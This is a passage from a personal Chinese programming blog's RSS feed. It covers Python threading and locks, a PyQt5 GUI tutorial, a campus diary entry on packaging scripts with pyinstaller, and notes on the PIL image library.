t1.start() #启动mythread
t2.start() #启动mythread
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>threading.Thread类的一些相关属性&lt;/p>
&lt;p>join()方法：调用join()后，直到调用join的线程运行完了其他线程才能运行&lt;/p>
&lt;pre tabindex="0">&lt;code> import threading
class mythread(threading.Thread):
def run(self):
for i in range(30):
print(i)
t1 = mythread()
t2 = mythread()
t1.start()
t2.start()
t1.join() #调用join()方法，这时候只能运行t1线程
&lt;/code>&lt;/pre>&lt;p>isAlive()方法： 用于判断线程是否运行，未调用start或者已经执行并结束，返回False&lt;/p>
&lt;p>name属性：表示线程名，默认是Thread-x x为序号，从1开始，第一个创建的县城就是Thread-1&lt;/p>
&lt;p>daemon属性：用来设置线程是否随主线程退出而退出&lt;/p>
&lt;p>daemon = False,默认，线程不会随主线程退出而推出，&lt;/p>
&lt;p>daemon = True，主线程结束时，其他子线程就会被强制结束&lt;/p>
&lt;/li>
&lt;li>
&lt;p>锁&lt;/p>
&lt;p>如果在一个进程里创建多个线程，如果各个线程之间有一定顺序关系，涉及到谁先谁后操作数据的时候，这时候就要用到锁这个概念了。&lt;/p>
&lt;p>python3中的threading模块有RLock()对象，实例化后就是一个锁对象。
对于这个lock，它有acquire()方法和release()方法，acquire()方法相当于上锁，release()方法相当于解锁。&lt;/p>
&lt;p>在lock.acquire()和lock.release()语句之间一次只能有一个线程进入，其余线程只能在acquire()处等待。&lt;/p>
&lt;p>代码:&lt;/p>
&lt;pre tabindex="0">&lt;code> import threading
class mythread(threading.Thread):
def run(self):
global x #声明全局变量
lock.acquire() #上锁
x+=10
print('%s:%d'%(self.name,x))
lock.release() #解锁
x = 0
lock = threading.RLock() #创建一个锁对象
thread_list = []
for i in range(5):
thread_list.append(mythread())
for i in thread_list:
i.start()
&lt;/code>&lt;/pre>&lt;p>一般lock.acquire()和lock.release()都放在thread对象的run方法里，毕竟，每个thread都是要运行run方法的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>停止thread&lt;/p>
&lt;p>在继承threading.Thread类基础上，可以设置一个running标志，然后循环，为它编写要给terminate()方法很简单，running设置成False就ok了。&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>Python-PIL库的使用</title><link>https://sera.wang/p/python-pil%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Wed, 24 Jan 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/python-pil%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;p>为了对付比赛，发现别人用qt写出来的应用挺好看的。昨天粗略看了一遍，记得不准确，今天重新开始看文档，一步步来吧。&lt;/p>
&lt;h1 id="运行一个最基本的窗口">运行一个最基本的窗口&lt;/h1>
&lt;pre tabindex="0">&lt;code>from PyQt5 import QtWidgets
# 导入PyQt5库的QtWidgets通用窗口类
class firstwindow(QtWidgets.QWidget):
#新建一个类，继承自QtWidgets.QWidget类方法
def __init__(self):
super(firstwindow,self).__init__()
#这里要重载一下mywindows,同时也包含了QtWidgets.QWidget的预加载项
import sys
app = QtWidgets.QApplication(sys.argv)
# pyqt 窗口必须在QApplication方法中使用，否则会报错
# QWidget:Must construct a QApplication before a QWidget
windows = firstwindow() #新建一个firstwindow对象，命名为windows
windows.show() #让窗口显示出来
sys.exit(app.exec_()) #启动事件循环，类似于Tkinter的mainloop()函数
&lt;/code>&lt;/pre>&lt;h1 id="qt-designer">Qt Designer&lt;/h1>
&lt;p>因为QtDesigner很方便，可以帮助开发，于是我们接下来就用用看Designer，新建一个Widget然后保存，是ui文件，我们需要用一行代码把它转成py文件&lt;/p>
&lt;p>在Python36/Lib/site-packages/PyQt5里打开cmd，&lt;/p>
&lt;p>pyuic5 ui文件名 -o 目标py文件名&lt;/p>
&lt;blockquote>
&lt;p>pyuic5 d:/python/pyqt/widget.ui -o d:/python/pyqt/widget.py&lt;/p>
&lt;/blockquote>
&lt;p>转换后代码:&lt;/p>
&lt;pre tabindex="0">&lt;code># -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets
class Ui_Form(object):
def setupUi(self, Form):
Form.setObjectName(&amp;quot;Form&amp;quot;)
Form.resize(400, 300)
self.retranslateUi(Form)
QtCore.QMetaObject.connectSlotsByName(Form)
def retranslateUi(self, Form):
_translate = QtCore.QCoreApplication.translate
Form.setWindowTitle(_translate(&amp;quot;Form&amp;quot;, &amp;quot;Form&amp;quot;))
&lt;/code>&lt;/pre>&lt;p>它就是一个类，但我们依旧可以把它当作一个ui，要运行一个窗口。我们依旧是要用QtWidgets.QWidget类的对象的show方法。&lt;/p>
&lt;p>所以代码这样写:&lt;/p>
&lt;pre tabindex="0">&lt;code>import sys
app = QtWidgets.QApplication(sys.argv)
window = QtWidgets.QWidget() #新建一个QtWidgets.QWidget类对象
ui = Ui_Form() # 把这个Ui_Form()对象实例化
ui.setupUi(window) #用这个ui的setupUi方法，参数是我们刚才新建的窗口window
window.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;p>其它都不变，因为ui带来的改变，只是增加了两行相应的代码而已。&lt;/p>
&lt;p>如果想让逻辑和界面分离的话，可以尝试重新写一个py导入ui转换后的这个py文件。&lt;/p>
&lt;pre tabindex="0">&lt;code>#比如ui转换后保存为ui_window.py
from PyQt5 import QtWidgets
from ui_window import Ui_Form
import sys
class ui_window(QtWidgets.QWidget,Ui_Form): #多态继承
def __init__(self):
super(ui_window,self).__init__()
self.setupUi(self)
if __name__ == '__main__':
app = QtWidgets.QApplication(sys.argv)
window = ui_window()
window.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;p>注：&lt;/p>
&lt;p>感觉学了一点web前端以后再看类似应用界面ui设计的会轻松很多…&lt;/p>
&lt;p>比如各种布局，边距什么的，应该会理解的更好。所以在Qt Designer里的设计和布局就按个人喜好来吧。哪个布局不懂多尝试就好了。接下来说的都是非ui相关的。&lt;/p>
&lt;h1 id="按键事件绑定">按键事件绑定&lt;/h1>
&lt;p>在designer里刚才的ui_window基础上，拖动一个PushButton到窗口里然后开启绑定模式(Edit Buddies)将这个PushButton绑定一个事件（比如点击后将整个窗口关闭），然后转换代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>#在setupUi方法里增加了四行代码，前三行是添加这个button按钮
#着重看第四行，它是给button的clicked属性绑定了一个事件(Form.close)，Form.close也就是将窗口的关闭方法。
#pushButton除了clicked属性还是pressed属性，还有released属性等等。。，相同的Form的动作也不止一个关闭，具体在Edit Buddies模式里可以看到。
self.pushButton = QtWidgets.QPushButton(Form)
self.pushButton.setGeometry(QtCore.QRect(40, 60, 93, 28))
self.pushButton.setObjectName(&amp;quot;pushButton&amp;quot;)
self.pushButton.clicked.connect(Form.close)
# self.按钮.点击.链接（窗口.关闭）
#在retranslateUi方法里增加了一行代码，因为我修改了一下Button实例的名字
self.pushButton.setText(_translate(&amp;quot;Form&amp;quot;, &amp;quot;Button&amp;quot;))
&lt;/code>&lt;/pre>&lt;p>所以要执行自己的函数，也就是要修改一下Form.close&lt;/p>
&lt;p>比如，在之前为了逻辑与界面分离而写的一个runwindow脚本里这样修改(先把Form.close这一行代码去掉，也就是按钮点击以后不让它关闭窗口)。&lt;/p>
&lt;p>在ui_window类里新建一个函数&lt;/p>
&lt;pre tabindex="0">&lt;code>....
self.pushButton.clicked.connect(self.my_func)
def my_func(self): #因为是在类里所以需要有参数self
print('按钮绑定函数已被执行！')
&lt;/code>&lt;/pre>&lt;p>这样点击按钮就执行了一次print。&lt;/p>
&lt;h1 id="信号signal和槽slot">信号(signal)和槽(slot)&lt;/h1>
&lt;p>pyqt5里其实有一个信号和槽的概念。相关的概念其实还有更多，但我想先了解这两个应该就能满足很多需求了。&lt;/p>
&lt;p>我说一下个人理解的，&lt;/p>
&lt;p>信号：当你打开了这个应用exe以后做的一个动作（比如对一次按钮的点击，或者一次输入）当你做了这个动作以后，你就发射（emit）了一个信号。当然信号和槽都是可以自定义的，你也可以选择不发射信号。&lt;/p>
&lt;p>槽：它可以是一个函数（一般我们也用它写函数），当我们做了一个动作发射了信号以后，肯定需要有东西接收啊，当然因为槽也可以自定义，所以也可以选择无视这些信号（但这样没有意义，因为这样不如不发射信号）。这个用来接收的东西就是槽。它和发射信号的函数事先绑定，从而一发射它就能接收到，然后执行这个槽函数。&lt;/p>
&lt;p>其实，化简一下这两个概念，就能很好理解。 点击一次，传参（也可以没参数）给响应的函数然后执行这个函数。&lt;/p>
&lt;p>而这个很简单的解释在pyqt里是需要用信号和槽来帮助编写的。我们来看一个基本的栗子。&lt;/p>
&lt;pre tabindex="0">&lt;code>#依旧是在原先runwindow脚本的基础上
from PyQt5 import QtWidgets,QtCore #因为要使用信号所以要导入QtCore类
from ui_window import Ui_Form
import sys,time
class ui_window(QtWidgets.QWidget,Ui_Form):
signal1 = QtCore.pyqtSignal() #定义信号1，要发射多个信号可以多次定义
def __init__(self):
super(ui_window,self).__init__()
self.setupUi(self)
self.my_button.clicked.connect(self.emit_func)
#将按钮绑定到emit_func（发射信号）这个函数上，也就是点击按钮就发射信号
self.signal1.connect(self.response_func) #这行也很重要！这一行确定了信号发给哪个函数！
def emit_func(self):
print('发射信号！\n等待5s...')
time.sleep(5)
self.signal1.emit() #这一步是真正的发射信号
def response_func(self):
print('收到信号!执行响应函数！')
#剩下的和之前一样，让窗口显示出来的就不写了...
&lt;/code>&lt;/pre>&lt;p>运行一下看效果，发现点击以后，首先执行和按钮的点击属性绑定的那个函数，而在这个函数里我们发射了信号1，然后因为这个信号1和槽函数绑定过，所以槽函数接收到了信号1，开始执行槽函数。&lt;/p>
&lt;p>传参: 发射信号同时还想要传递参数的话，可以这样改.&lt;/p>
&lt;pre tabindex="0">&lt;code>.......
signal = QtCore.pyqtSignal(str)
#定义信号，发射时带的参数为字符串型参数
#这个参数类型可以是:str int list float object tuple dict
self.signal.connect(self.response_func)
def response_func(self,param): #槽函数定义接收参数param
print('接收参数',param)
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>一个动作可以发射多个信号，一个信号可以发给多个槽，一个槽也可以绑定多个信号。&lt;/p>
&lt;/blockquote>
&lt;h1 id="消息框控件-qmessagebox">消息框控件 QMessageBox&lt;/h1>
&lt;p>先看一个简单的例子,在runwindow基础上（接下来不具体说都是在runwindow基础上修改）&lt;/p>
&lt;pre tabindex="0">&lt;code>#只写增加的代码
from PyQt5.QtWidgets import QMessageBox #导入消息框类
......
self.my_button.clicked.connect(self.show_msg)
def show_msg(self):
result = QMessageBox.information(self,('标题'),('显示信息'),QMessageBox.StandardButtons(QMessageBox.Yes|QMessageBox.No))
# QMessageBox.information()显示消息框，其它参数不介绍了，最后一个参数QMessageBox.StandardButtons(),添加按钮，比如QMessageBox.Yes
&lt;/code>&lt;/pre>&lt;p>QMessageBox的对话框只是图标不同，其它没有太大差别：&lt;/p>
&lt;ol>
&lt;li>QMessageBox.information 信息框&lt;/li>
&lt;li>QMessageBox.question 问答框&lt;/li>
&lt;li>QMessageBox.warning 警告框&lt;/li>
&lt;li>QMessageBox.critical 危险框&lt;/li>
&lt;li>QMessageBox.about 关于&lt;/li>
&lt;/ol>
&lt;h2 id="参数">参数&lt;/h2>
&lt;blockquote>
&lt;p>QMessageBox.XXX(QWidget对象,(‘标题’),(‘信息’),QMessageBox.StandardButtons(要显示的按钮))&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>QMessageBox.about对于最后一个参数是没有的，其它相同&lt;/p>
&lt;/blockquote>
&lt;h2 id="按钮种类">按钮种类:&lt;/h2>
&lt;ul>
&lt;li>QMessageBox.About&lt;/li>
&lt;li>QMessageBox.Apply&lt;/li>
&lt;li>QMessageBox.Cancel&lt;/li>
&lt;li>QMessageBox.Close&lt;/li>
&lt;li>QMessageBox.Discard&lt;/li>
&lt;li>QMessageBox.Help&lt;/li>
&lt;li>QMessageBox.Ignore&lt;/li>
&lt;li>QMessageBox.No&lt;/li>
&lt;li>QMessageBox.NoToAll&lt;/li>
&lt;li>QMessageBox.Ok&lt;/li>
&lt;li>QMessageBox.Open&lt;/li>
&lt;li>QMessageBox.Reset&lt;/li>
&lt;li>QMessageBox.RestoreDefaults&lt;/li>
&lt;li>QMessageBox.Retry&lt;/li>
&lt;li>QMessageBox.Save&lt;/li>
&lt;li>QMessageBox.SaveAll&lt;/li>
&lt;li>QMessageBox.Yes&lt;/li>
&lt;li>QMessageBox.YesToAll&lt;/li>
&lt;/ul>
&lt;p>按自己需求来用就好，另外每个按钮都有一个返回值，&lt;/p>
&lt;pre tabindex="0">&lt;code>result = QMessageBox.information(...,QMessageBox.StandardButtons(QMessageBox.Yes))
print(result)
&lt;/code>&lt;/pre>&lt;p>可以根据返回值来确认用户点击了哪个按钮。&lt;/p>
&lt;h1 id="标准输入框控件-qinputdialog">标准输入框控件 QInputDialog&lt;/h1>
&lt;p>例子（designer里拖四个PushButton到Widget上）:&lt;/p>
&lt;pre tabindex="0">&lt;code>......
self.button1.clicked.connect(self.input)
def input(self):
result = QInputDialog.getText(self,('标题'),('提示'),QLienEdit.Normal,('默认文字'))
&lt;/code>&lt;/pre>&lt;p>例子里是获取输入文本框，类似的还有三个:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>QInputDialog.getInt(self,(‘标题’),(‘提示’),0,-65535,65536,1)&lt;/p>
&lt;blockquote>
&lt;p>0是默认数值，默认范围-65535~65536,1是步长&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>QInputDialog.getDouble(self,(‘标题’),(‘提示’),0,-65535,65536,10)&lt;/p>
&lt;blockquote>
&lt;p>其它同上，10是小数点后位数&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>item = [‘item1’,’item2’,’item3’]&lt;/p>
&lt;p>QInputDialog.getItem(self,(‘标题’),(‘提示’),item,1,True)&lt;/p>
&lt;blockquote>
&lt;p>这个可以当成有选择项的输入框，item是自定义列表，1是默认选中项目，True/False指 列表框是否可编辑&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;p>它们都是有返回值的，返回一个list,list[0]是输入的内容(字符串)，list[1]是个布尔值，代表是否输入&lt;/p>
&lt;h1 id="标准文件打开保存框-qfiledialog">标准文件打开保存框 QFileDialog&lt;/h1>
&lt;p>先看例子吧&lt;/p>
&lt;ol>
&lt;li>
&lt;p>打开文件框&lt;/p>
&lt;pre tabindex="0">&lt;code>#一般都是和按键绑定的函数，所以接下来都只写一个函数
from PyQt5.QtWidgets import QFileDialog
def open_file(self):
result = QFileDialog.getOpenFileName(self,('标题'),('d:/'),('jpg(*.jpg);;bmp(*.bmp)'),None)
#d:/是默认搜索目录
#打开单个文件。返回list，result[0]是文件路径，result[1]是过滤类型（字符串，和代码里的定义相同，比如: 'jpg(*.jpg)'）
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;/blockquote>
&lt;p>打开多个文件的话，改成getOpenFileNames就好了,区别是返回的list[0]是一个字符串列表（多个文件名）
要过滤多个文件类型用两个分号 ;; 隔开类型。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>保存文件框&lt;/p>
&lt;pre tabindex="0">&lt;code>def save_file(self):
result = QFileDialog.getSaveFileName(self,('标题'),('d:/'),('*.exe;;*.*'),None,QFileDialog.Options(QFileDialog.DontConfirmOverwrite))
#返回值是个list，list[0]是文件名，list[1]是文件类型('*.exe')
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>事实上，无论是打开文件框还是保存文件框，它都是只返回一个文件名和文件类型的list，并不会执行打开和保存操作，这是需要注意的…它只是提供一个图形化界面给用户不错的体验而已。实际打开或保存文件还是要我们通过获取到的文件名来用python写具体处理。&lt;/p>
&lt;h1 id="主窗口-mainwindow">主窗口 MainWindow&lt;/h1>
&lt;p>它不同于Widget，包含了菜单栏，工具栏，任务栏等等,也是我们比较常见的应用的模板&lt;/p>
&lt;p>在designer里重新创建一个新的文件 ui_mainwindow.ui 在里面创建一个mainwindow。&lt;/p>
&lt;p>pyuic5转换成py文件以后，要显示这个窗口需要有一点变动。&lt;/p>
&lt;pre tabindex="0">&lt;code>#runmainwindow.py
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QMainWindow #从QtWidgets里导入QMainWindow类
from ui_mainwindow import Ui_MainWindow
import sys
class ui_mainwindow(QMainWindow,Ui_MainWindow): #继承QMainWindow类
def __init__(self):
super(ui_mainwindow,self).__init__()
self.setupUi(self)
if __name__ == '__main__':
app = QtWidgets.QApplication(sys.argv)
window = ui_mainwindow()
window.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;p>代码变化不大&lt;/p>
&lt;h2 id="菜单栏">【菜单栏】&lt;/h2>
&lt;p>直接输入文字就可以了，还可以在Action Editor里编辑快捷键Short Cut。
但是要注意的是，它的PushButton是不同的，编写函数的代码也不同，直接看例子吧&lt;/p>
&lt;pre tabindex="0">&lt;code>#菜单项名称: Open_File，我们要为它编写一个函数
#......前面都是相同的代码
self.actionOpen_File.triggered.connect(self.show_message) #绑定函数show_message
def show_message(self):
print('here is message')
#这样就为Open File这个菜单项绑定了一个函数，想怎么写这个函数就看个人吧
#比如Open File打开文件，我们可以打开一个打开文件框控件，诸如此类的...
&lt;/code>&lt;/pre>&lt;p>可以看到，MainWindow里菜单项和Widget的button项的不同之处仅仅只有绑定函数的代码不一样而已。（triggered/clicked）&lt;/p>
&lt;h1 id="动态加载子窗口">动态加载子窗口&lt;/h1>
&lt;p>我们在创建了一个主窗口MainWindow的基础上，想要增加一个功能，就是能够通过一次点击，打开或者隐藏一个子窗口（这个使用场景非常多），要做什么呢？&lt;/p>
&lt;p>在designer里要做的事：
拖一个布局layout（比如栅格布局gridlayout）到主窗口里，命名为 main_grid
新建一个widget窗口，命名为ui_childwindow,为了结果明显，我们在childwindow里拖点东西进去，比如几个pushbutton，这些随意。
然后我们将主窗口和子窗口的ui文件转换成py，开始编写代码:&lt;/p>
&lt;pre tabindex="0">&lt;code>from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QMainWindow
from ui_mainwindow import Ui_mainwindow
from ui_childwindow import Ui_childwindow
import sys
#子窗口类的编写，子窗口是widget所以继承QtWidgets.QWidget类
class ui_childwindow(QtWidgets.QWidget,Ui_childwindow):
def __init__(self):
super(ui_childwindow,self).__init__()
self.setupUi(self)
class ui_mainwindow(QMainWindow,Ui_mainwindow):
def __init__(self):
super(ui_mainwindow,self).__init__()
self.setupUi(self)
self.childwindow = ui_childwindow() #实例化一个子窗口
self.run()
def run(self):
self.actionOpen.triggered.connect(self.show_childwindow)
#给菜单项按钮绑定一个show_childwindow函数，功能和它名字一样
self.actionExit.triggered.connect(self.hide_childwindow)
#给菜单项按钮绑定一个hide_childwindow函数，隐藏子窗口
def show_childwindow(self):
self.main_grid.addWidget(self.childwindow)
#上面这一行是将实例好的子窗口添加到了主窗口的名为main_grid的布局里！
self.childwindow.show() #显示子窗口
def hide_childwindow(self):
self.childwindow.hide() #隐藏子窗口
#显示主窗口的代码和之前的一样，可参照之前的代码
&lt;/code>&lt;/pre>&lt;p>也就是说，动态加载子窗口是很容易的，只需要三行代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>self.childwindow = ui_childwindow() #实例化一个子窗口
self.main_grid.addWidget(self.childwindow) #添加子窗口到主窗口的一个布局里
self.childwindow.show() #让子窗口显示出来
&lt;/code>&lt;/pre>&lt;h1 id="底端状态显示-statusbar">底端状态显示 statusbar&lt;/h1>
&lt;p>新建一个MainWindow以后就自带了一个statusbar属性，一般可以用它来显示一些状态&lt;/p>
&lt;pre tabindex="0">&lt;code>self.statusbar.showMessage('this is statusbar.')
&lt;/code>&lt;/pre>&lt;p>使用很简单&lt;/p>
&lt;h1 id="radiobutton-控件">RadioButton 控件&lt;/h1>
&lt;p>单选按钮，如果在一个布局里放三个按钮，那同时只能一个被选中，这是自动实现的。&lt;/p>
&lt;p>radiobutton的属性:&lt;/p>
&lt;ol>
&lt;li>isChecked() 返回True/False,判断按钮是否被选中&lt;/li>
&lt;li>setChecked(True) True/False设置按钮是否被选中&lt;/li>
&lt;/ol>
&lt;p>其它和普通PushButton基本无异，比如clicked属性，依旧可以用来connect自己的函数。&lt;/p>
&lt;h1 id="checkbox-控件">CheckBox 控件&lt;/h1>
&lt;p>复选框按钮，可以复选，除此以外和RadioButton,PushButton无异。&lt;/p>
&lt;h1 id="单行文本输入框控件-qlineedit">单行文本输入框控件 QLineEdit&lt;/h1>
&lt;p>属性：&lt;/p>
&lt;ol>
&lt;li>textChanged 很实用的一个属性，用来绑定文本状态change以后需要执行的函数&lt;/li>
&lt;li>text() 返回文本内容，字符串类型&lt;/li>
&lt;li>setText(‘文本’) 设置内容&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>example&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>self.lineEdit.textChanged.connect(self.showDynamicText)
def showDynamicText(self):
print('content:',self.lineEdit.text())
&lt;/code>&lt;/pre>&lt;h1 id="combobox控件">combobox控件&lt;/h1>
&lt;ol>
&lt;li>
&lt;p>currentText()&lt;/p>
&lt;pre tabindex="0">&lt;code>self.combobox.currentText() #返回当前选项值(str)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>currentTextChanged属性 如果用户选择了combobox中的其它选项，则会触发该事件。&lt;/p>
&lt;pre tabindex="0">&lt;code>self.combobox.currentTextChanged.connect(self.my_func)
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h1 id="listwidget控件">listWidget控件&lt;/h1>
&lt;p>即列表框，我通常用它来显示一些结果。&lt;/p>
&lt;p>大小还有其他一些什么设置都可以在qt designer里实现。&lt;/p>
&lt;p>这里讲一个比较有用的需要代码实现的，就是自己给listWidget添加新的值&lt;/p>
&lt;pre tabindex="0">&lt;code>item = QtWidgets.QListWidgetItem() #实例化一个QListWidgetItem()对象
self.listWidget.addItem(item) #把实例好的这个对象添加进listWidget里
self.listWidget.item(0).setText('新添加值') #给新对象添加一个值。
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>len(self.listWidget)&lt;/p>
&lt;p>可以用来来获得它的长度，但它并不能用列表表示..&lt;/p>
&lt;/li>
&lt;li>
&lt;p>self.listWidget.row(item)&lt;/p>
&lt;p>可以获得一个item在列表里的行数(从0开始)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>self.listWidget.removeItemWidget(item)&lt;/p>
&lt;p>移除一个item，无返回值（将item这个占用删除）&lt;/p>
&lt;p>删除listWidget里的一个item的值&lt;/p>
&lt;pre tabindex="0">&lt;code>self.listWidget.removeItemWidget(self.listWidget.takeItem(len(self.listWidget)-1)) #删除listWidget最后一项item，并解除它的占用
len(self.listWidget) #这时候再看list长度，发现的确减了1，同时显示的最后一项item也消失了。
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>对listWidget里的一个item赋鼠标操作，本来想这么写的…后来发现只需要一行代码就好了。&lt;/p>
&lt;p>listwidget本身就有doubleClicked属性，connect一个函数就相当于给所有listWidget的item都赋了这么一个函数…很方便…&lt;/p>
&lt;p>唉，我花了2个小时找文章..结果偶然在动作模式里发现pyQt5的这个功能…真是想吐血。&lt;/p>
&lt;pre tabindex="0">&lt;code>self.listWidget.doubleClicked.connect(self.your_function)
&lt;/code>&lt;/pre>&lt;h1 id="样式表-stylesheet">样式表 stylesheet&lt;/h1>
&lt;p>可以直接在designer里设置，比较方便，具体语法可以参照css&lt;/p>
&lt;p>background-color:red #背景颜色:红&lt;/p>
&lt;p>color:red #字体:红&lt;/p>
&lt;p>不在designer里设置的话就是这样&lt;/p>
&lt;pre tabindex="0">&lt;code>self.setStyleSheet('QWidget{background-color:red}')
&lt;/code>&lt;/pre>&lt;h1 id="控件获取焦点">控件获取焦点&lt;/h1>
&lt;p>一般输入控件都是会有setFocus()属性，想让它获取焦点只要，x.setFocus()就好&lt;/p>
&lt;h1 id="qplaintextedit">QPlainTextEdit&lt;/h1>
&lt;p>纯文本输入框控件&lt;/p>
&lt;ol>
&lt;li>
&lt;p>addPlainText&lt;/p>
&lt;p>可以从文本最后添加内容，每次add最后自动会有个换行&lt;/p>
&lt;/li>
&lt;li>
&lt;p>setText&lt;/p>
&lt;p>直接设置文本，原有文本会被覆盖&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="some-tips">some tips&lt;/h1>
&lt;p>(写在最后，也当作提醒自己一些地方要注意)&lt;/p>
&lt;ul>
&lt;li>不管什么控件，要绑定一个函数，一般都是要这个控件的某一个动作后面跟.connect(要绑定的函数)，直接在动作里填函数是完全没效果的，可能会让你想不停地捶地。&lt;/li>
&lt;li>如果要在一个窗口里，给它的一个比如按钮绑定一个事件，这个事件要弹出一个新窗口(非MessageBox)，有一种方法是新建一个窗口的ui，然后在要绑定的窗口的&lt;strong>init&lt;/strong>方法里就要先生成这个窗口（创建这个新窗口的实例），绑定事件里再只要选择让这个窗口show()或者hide()就可以了。 否则会出现很多问题。&lt;/li>
&lt;/ul></description></item><item><title>校园杂记11: 考试考完，摸鱼摸完</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B011-%E8%80%83%E8%AF%95%E8%80%83%E5%AE%8C%E6%91%B8%E9%B1%BC%E6%91%B8%E5%AE%8C/</link><pubDate>Tue, 16 Jan 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B011-%E8%80%83%E8%AF%95%E8%80%83%E5%AE%8C%E6%91%B8%E9%B1%BC%E6%91%B8%E5%AE%8C/</guid><description>&lt;p>好久没更新，9号考完试，摸鱼摸的已经摸到晋太元中，不知代码为何物了:(&lt;/p>
&lt;p>先列一下寒假的任务（先后顺序）:&lt;/p>
&lt;ol>
&lt;li>老师要求写一个转换工具（完成）&lt;/li>
&lt;li>另一个老师要求给团队写网页（还没开始想）&lt;/li>
&lt;li>比赛：写一个打字软件（要用java写…一年半没碰java..我真的…）&lt;/li>
&lt;li>做07-17年的web攻击分析，用python画出变化图（有思路）&lt;/li>
&lt;li>看掉tcpip协议：卷一&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>今天是把第一个任务完成了，改了很多次bug还有细节，就是写了一个IEEE754格式16进制数和十进制的互转工具。&lt;/p>
&lt;p>学到了python怎么转exe! 这是今天唯一让我开心的(比起上面那些task来说)!&lt;/p>
&lt;p>先pip install pyinstaller 安装好pyinstaller脚本&lt;/p>
&lt;p>之后只要命令行执行下列这句就好了&lt;/p>
&lt;blockquote>
&lt;p>python your_path_here/pyinstaller-script.py -F -w target.py&lt;/p>
&lt;/blockquote>
&lt;p>一般pyinstaller-script.py文件是在python语言目录下的Scripts文件夹内的&lt;/p>
&lt;p>-w 参数是避免在windows下执行exe跳出cmd影响美观
很简单吧！&lt;/p>
&lt;p>就算只会写一句hello world!&lt;/p>
&lt;p>我也要!&lt;/p>
&lt;p>把它转成exe!&lt;/p>
&lt;p>开启我的代码传播之路!&lt;/p>
&lt;p>链接: &lt;a class="link" href="https://pan.baidu.com/s/1kWYdmtT" target="_blank" rel="noopener"
>https://pan.baidu.com/s/1kWYdmtT&lt;/a> 密码: dwxp&lt;/p>
&lt;hr>
&lt;p>好的，只剩四个task了，有点想史&lt;/p>
&lt;p>对了!!!&lt;/p>
&lt;p>血源真的很棒!!!!&lt;/p>
&lt;p>有生之年希望能出2&lt;/p>
&lt;p>预购了mhw，结果1.20就得回家，这是为什么!!!人类为什么要过年!!!
2.26返校才能玩到，内心是崩溃的，有没有大佬寒假借我台4啊QAQ我不想抱着一张光盘过年啊…&lt;/p></description></item><item><title>Python-PIL库的使用</title><link>https://sera.wang/p/python-pil%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Fri, 01 Dec 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/python-pil%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;p>只记录下我用到的，&lt;/p>
&lt;pre tabindex="0">&lt;code>from PIL import Image,ImageDraw,ImageChops
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>image = Image.open(“test.jpg”)&lt;/p>
&lt;blockquote>
&lt;p>打开图片.&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image = image.convert(“L”)&lt;/p>
&lt;blockquote>
&lt;p>转成灰度图片，和黑白图片有区别&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/27060551.jpg" alt="img" />&lt;/p>
&lt;p>左边是convert的结果，右边是黑白（黑0/白255）图片。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>image.save(“result.png”)&lt;/p>
&lt;blockquote>
&lt;p>存储成图片文件&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image = image.point( array[] , ‘1’ )&lt;/p>
&lt;p>这个array[] 实际上要看你的图片是什么类型的。如果不是PNG最好先转成PNG，或者使用convert(“L”) 把 image 转成灰度图片。&lt;/p>
&lt;p>因此，这里的array[] 其实是一个长度为256的数组，也就是代表了0-255灰度值。&lt;/p>
&lt;p>这个函数的作用就是图片根据这个数组里每一位灰度值，比如array[27] 为0，那么图片的像素里所有灰度值等于array[27]的像素值都变成0（即变黑），否则就变成1。和二值（0/255）黑白图片很像，但实际上是（0/1）二值图片。&lt;/p>
&lt;p>`example:&lt;/p>
&lt;p>table = []&lt;/p>
&lt;p>for i in range(256):&lt;/p>
&lt;pre tabindex="0">&lt;code>if i &amp;amp;lt; 180: # 所有灰度值小于180的都置0
table.append(0)
else:
table.append(1)
